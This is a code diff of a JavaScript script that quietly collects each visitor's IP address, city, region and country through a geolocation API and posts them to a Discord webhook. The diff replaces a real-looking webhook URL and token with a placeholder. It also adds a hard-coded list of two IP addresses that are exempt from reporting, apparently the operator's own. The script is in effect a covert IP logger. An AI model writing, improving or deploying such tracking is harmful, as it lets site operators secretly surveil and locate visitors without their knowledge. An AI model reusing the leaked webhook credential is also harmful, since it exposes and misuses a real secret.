@@ -1,5 +1,8 @@
 // Replace this with your Discord webhook URL
-const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1439014935547084936/2biZ42YXRxzLnCayzsmK2REI13caqw2aj-CTpWRXv-CD37uBkLYBqhjbHikkck2SBibz';
+const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+// List of IPs to block from sending data
+const BLOCKED_IPS = ['92.29.204.199', '77.100.219.194'];
 
 // Function to send data to Discord webhook
 async function sendToDiscord(data) {
@@ -49,8 +52,15 @@ async function collectVisitorInfo() {
     const ipResponse = await fetch('https://ipapi.co/json/');
     const ipData = await ipResponse.json();
 
+    // Check if the IP is in the blocked list
+    const visitorIP = ipData.ip || 'Unknown';
+    if (BLOCKED_IPS.includes(visitorIP)) {
+      console.log('Visitor IP is blocked, skipping Discord webhook.');
+      return; // Exit the function without sending data
+    }
+
     // Add IP and geolocation data to visitorData
-    visitorData.IP = ipData.ip || 'Unknown';
+    visitorData.IP = visitorIP;
     visitorData.City = ipData.city || 'Unknown';
     visitorData.Region = ipData.region || 'Unknown';
     visitorData.Country = ipData.country_name || 'Unknown';
@@ -62,11 +72,13 @@ async function collectVisitorInfo() {
     await sendToDiscord(visitorData);
   } catch (error) {
     console.error('Error collecting visitor info:', error);
-    // Optionally send error info to Discord
-    await sendToDiscord({
-      Error: 'Failed to collect visitor info',
-      Details: error.message,
-    });
+    // Optionally send error info to Discord (unless IP is blocked)
+    if (!BLOCKED_IPS.includes(visitorData.IP)) {
+      await sendToDiscord({
+        Error: 'Failed to collect visitor info',
+        Details: error.message,
+      });
+    }
   }
 }
 
